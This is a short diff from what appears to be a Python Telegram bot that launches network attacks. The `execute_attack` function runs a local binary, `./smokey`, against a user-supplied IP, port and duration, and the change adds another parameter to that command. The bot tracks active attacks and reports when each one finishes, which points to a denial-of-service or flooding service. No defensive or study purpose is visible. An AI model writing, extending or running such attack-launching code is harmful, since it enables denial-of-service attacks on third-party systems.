@@ -331,7 +331,7 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 def execute_attack(ip, port, duration, attack_id, chat_id, context, user_name):
     active_attacks.append(attack_id)
-    os.system(f"./smokey {ip} {port} {duration} 1200")
+    os.system(f"./smokey {ip} {port} {duration} 1024 1200")
     asyncio.run(send_attack_finished_message(chat_id, ip, port, context, user_name))
     if attack_id in active_attacks:
         active_attacks.remove(attack_id)
